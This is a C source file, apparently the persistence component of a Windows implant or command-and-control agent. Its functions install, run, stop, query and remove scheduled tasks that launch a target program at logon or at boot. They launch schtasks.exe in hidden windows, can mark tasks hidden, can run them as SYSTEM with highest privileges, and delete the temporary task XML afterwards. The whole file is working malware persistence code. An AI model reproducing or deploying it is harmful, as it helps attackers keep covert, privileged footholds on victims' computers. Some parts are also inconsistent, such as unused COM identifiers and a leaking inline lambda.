#include "PersistTask.h"
#include "utils.h"
#include "ntdll.h"

// Task Scheduler interfaces
// Note: This uses the new Task Scheduler 2.0 API (Vista+)

// CLSID_TaskScheduler = {0F87369F-A4E5-4CFC-BD3E-73E6154572DD}
static const CLSID CLSID_TaskScheduler = { 0x0F87369F, 0xA4E5, 0x4CFC, {0xBD, 0x3E, 0x73, 0xE6, 0x15, 0x45, 0x72, 0xDD} };

// IID_ITaskService = {2FABA4C7-4DA9-4013-9697-20CC3FD40F85}
static const IID IID_ITaskService = { 0x2FABA4C7, 0x4DA9, 0x4013, {0x96, 0x97, 0x20, 0xCC, 0x3F, 0xD4, 0x0F, 0x85} };

// Install task at logon
BOOL InstallTaskPersistLogon(LPCSTR taskName, LPCSTR targetPath, BOOL bRunHighest) {
    if (!taskName || !targetPath) return FALSE;

    TASK_PERSIST_CONFIG config = { 0 };
    config.taskName = taskName;
    config.targetPath = targetPath;
    config.triggerType = TASK_TRIGGER_LOGON;
    config.bRunHighest = bRunHighest;
    config.bEnabled = TRUE;

    return InstallTaskPersistEx(&config);
}

// Install task at startup (requires admin)
BOOL InstallTaskPersistStartup(LPCSTR taskName, LPCSTR targetPath) {
    if (!taskName || !targetPath) return FALSE;

    if (!IsElevate()) return FALSE;

    TASK_PERSIST_CONFIG config = { 0 };
    config.taskName = taskName;
    config.targetPath = targetPath;
    config.triggerType = TASK_TRIGGER_STARTUP;
    config.bRunAsSystem = TRUE;
    config.bRunHighest = TRUE;
    config.bEnabled = TRUE;

    return InstallTaskPersistEx(&config);
}

// Install task with full configuration (using schtasks.exe)
BOOL InstallTaskPersistEx(PTASK_PERSIST_CONFIG pConfig) {
    if (!pConfig || !pConfig->taskName || !pConfig->targetPath) {
        return FALSE;
    }

    // Build schtasks command
    CHAR cmdLine[1024] = { 0 };
    CHAR xmlFile[MAX_PATH] = { 0 };

    // Get temp path for XML file
    typedef DWORD(WINAPI* GetTempPathA_t)(DWORD, LPSTR);
    typedef UINT(WINAPI* GetTempFileNameA_t)(LPCSTR, LPCSTR, UINT, LPSTR);

    GetTempPathA_t pGetTempPathA = (GetTempPathA_t)GetProcAddress(
        SysModules->Kernel32, "GetTempPathA");
    GetTempFileNameA_t pGetTempFileNameA = (GetTempFileNameA_t)GetProcAddress(
        SysModules->Kernel32, "GetTempFileNameA");

    if (!pGetTempPathA || !pGetTempFileNameA) return FALSE;

    CHAR tempPath[MAX_PATH] = { 0 };
    pGetTempPathA(MAX_PATH, tempPath);
    pGetTempFileNameA(tempPath, "tsk", 0, xmlFile);

    // Create XML file for task
    // This is a simplified task XML
    CHAR taskXml[2048] = { 0 };
    const char* triggerXml = "";

    switch (pConfig->triggerType) {
    case TASK_TRIGGER_LOGON:
        triggerXml = "<LogonTrigger><Enabled>true</Enabled></LogonTrigger>";
        break;
    case TASK_TRIGGER_STARTUP:
        triggerXml = "<BootTrigger><Enabled>true</Enabled></BootTrigger>";
        break;
    case TASK_TRIGGER_DAILY:
        triggerXml = "<CalendarTrigger><StartBoundary>2024-01-01T00:00:00</StartBoundary><Enabled>true</Enabled><ScheduleByDay><DaysInterval>1</DaysInterval></ScheduleByDay></CalendarTrigger>";
        break;
    default:
        triggerXml = "<LogonTrigger><Enabled>true</Enabled></LogonTrigger>";
        break;
    }

    ApiWin->snprintf(taskXml, sizeof(taskXml),
        "<?xml version=\"1.0\" encoding=\"UTF-16\"?>"
        "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">"
        "<Triggers>%s</Triggers>"
        "<Principals><Principal><UserId>%s</UserId><LogonType>InteractiveToken</LogonType><RunLevel>%s</RunLevel></Principal></Principals>"
        "<Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>false</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>%s</Enabled><Hidden>%s</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>PT72H</ExecutionTimeLimit><Priority>7</Priority></Settings>"
        "<Actions Context=\"Author\"><Exec><Command>%s</Command>%s</Exec></Actions>"
        "</Task>",
        triggerXml,
        pConfig->bRunAsSystem ? "S-1-5-18" : "",
        pConfig->bRunHighest ? "HighestAvailable" : "LeastPrivilege",
        pConfig->bEnabled ? "true" : "false",
        pConfig->bHidden ? "true" : "false",
        pConfig->targetPath,
        pConfig->arguments && strlen(pConfig->arguments) > 0 ?
        ([](LPCSTR args, char* buf) -> char* {
            ApiWin->snprintf(buf, 256, "<Arguments>%s</Arguments>", args);
            return buf;
        })(pConfig->arguments, (char*)MemAllocLocal(256)) : ""
    );

    // Write XML to file
    HANDLE hFile = ApiWin->CreateFileA(xmlFile, GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        // Convert to UTF-16
        WCHAR xmlWide[2048] = { 0 };
        typedef int(WINAPI* MultiByteToWideChar_t)(UINT, DWORD, LPCSTR, int, LPWSTR, int);
        MultiByteToWideChar_t pMultiByteToWideChar = (MultiByteToWideChar_t)GetProcAddress(
            SysModules->Kernel32, "MultiByteToWideChar");

        if (pMultiByteToWideChar) {
            pMultiByteToWideChar(CP_ACP, 0, taskXml, -1, xmlWide, 2048);
            DWORD written = 0;
            ApiWin->WriteFile(hFile, "\xFF\xFE", 2, &written, NULL); // BOM
            ApiWin->WriteFile(hFile, xmlWide, (DWORD)(wcslen(xmlWide) * 2), &written, NULL);
        }
        ApiNt->NtClose(hFile);

        // Build schtasks command
        ApiWin->snprintf(cmdLine, sizeof(cmdLine),
            "schtasks.exe /Create /TN \"%s\" /XML \"%s\" /F",
            pConfig->taskName, xmlFile);

        // Execute command
        STARTUPINFOA si = { sizeof(STARTUPINFOA) };
        PROCESS_INFORMATION pi = { 0 };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        if (ApiWin->CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            ApiWin->WaitForSingleObject(pi.hProcess, 30000);
            ApiNt->NtClose(pi.hProcess);
            ApiNt->NtClose(pi.hThread);
        }
    }

    // Cleanup
    if (xmlFile[0]) {
        ApiWin->DeleteFileA(xmlFile);
    }

    // Verify task was created
    return CheckTaskExist(pConfig->taskName);
}

// Remove scheduled task
BOOL RemoveTaskPersist(LPCSTR taskName) {
    if (!taskName) return FALSE;

    CHAR cmdLine[256] = { 0 };
    ApiWin->snprintf(cmdLine, sizeof(cmdLine),
        "schtasks.exe /Delete /TN \"%s\" /F", taskName);

    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (ApiWin->CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        ApiWin->WaitForSingleObject(pi.hProcess, 30000);

        DWORD exitCode = 0;
        ApiWin->GetExitCodeProcess(pi.hProcess, &exitCode);

        ApiNt->NtClose(pi.hProcess);
        ApiNt->NtClose(pi.hThread);

        return exitCode == 0;
    }

    return FALSE;
}

// Check if task exists
BOOL CheckTaskExist(LPCSTR taskName) {
    if (!taskName) return FALSE;

    CHAR cmdLine[256] = { 0 };
    ApiWin->snprintf(cmdLine, sizeof(cmdLine),
        "schtasks.exe /Query /TN \"%s\"", taskName);

    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (ApiWin->CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        ApiWin->WaitForSingleObject(pi.hProcess, 10000);

        DWORD exitCode = 1;
        ApiWin->GetExitCodeProcess(pi.hProcess, &exitCode);

        ApiNt->NtClose(pi.hProcess);
        ApiNt->NtClose(pi.hThread);

        return exitCode == 0;
    }

    return FALSE;
}

// Run task
BOOL RunTaskPersist(LPCSTR taskName) {
    if (!taskName) return FALSE;

    CHAR cmdLine[256] = { 0 };
    ApiWin->snprintf(cmdLine, sizeof(cmdLine),
        "schtasks.exe /Run /TN \"%s\"", taskName);

    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (ApiWin->CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        ApiWin->WaitForSingleObject(pi.hProcess, 10000);

        DWORD exitCode = 0;
        ApiWin->GetExitCodeProcess(pi.hProcess, &exitCode);

        ApiNt->NtClose(pi.hProcess);
        ApiNt->NtClose(pi.hThread);

        return exitCode == 0;
    }

    return FALSE;
}

// Stop task
BOOL StopTaskPersist(LPCSTR taskName) {
    if (!taskName) return FALSE;

    CHAR cmdLine[256] = { 0 };
    ApiWin->snprintf(cmdLine, sizeof(cmdLine),
        "schtasks.exe /End /TN \"%s\"", taskName);

    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (ApiWin->CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        ApiWin->WaitForSingleObject(pi.hProcess, 10000);

        DWORD exitCode = 0;
        ApiWin->GetExitCodeProcess(pi.hProcess, &exitCode);

        ApiNt->NtClose(pi.hProcess);
        ApiNt->NtClose(pi.hThread);

        return exitCode == 0;
    }

    return FALSE;
}

// Enable/disable task
BOOL SetTaskEnabled(LPCSTR taskName, BOOL bEnable) {
    if (!taskName) return FALSE;

    CHAR cmdLine[256] = { 0 };
    ApiWin->snprintf(cmdLine, sizeof(cmdLine),
        "schtasks.exe /Change /TN \"%s\" /%s", taskName,
        bEnable ? "ENABLE" : "DISABLE");

    STARTUPINFOA si = { sizeof(STARTUPINFOA) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (ApiWin->CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        ApiWin->WaitForSingleObject(pi.hProcess, 10000);

        DWORD exitCode = 0;
        ApiWin->GetExitCodeProcess(pi.hProcess, &exitCode);

        ApiNt->NtClose(pi.hProcess);
        ApiNt->NtClose(pi.hThread);

        return exitCode == 0;
    }

    return FALSE;
}

// Query task status
BOOL QueryTaskStatus(LPCSTR taskName, DWORD* pState) {
    if (!taskName || !pState) return FALSE;

    // Would need to parse schtasks /Query /V output
    // Simplified implementation
    *pState = 0; // TASK_STATE_UNKNOWN

    return CheckTaskExist(taskName);
}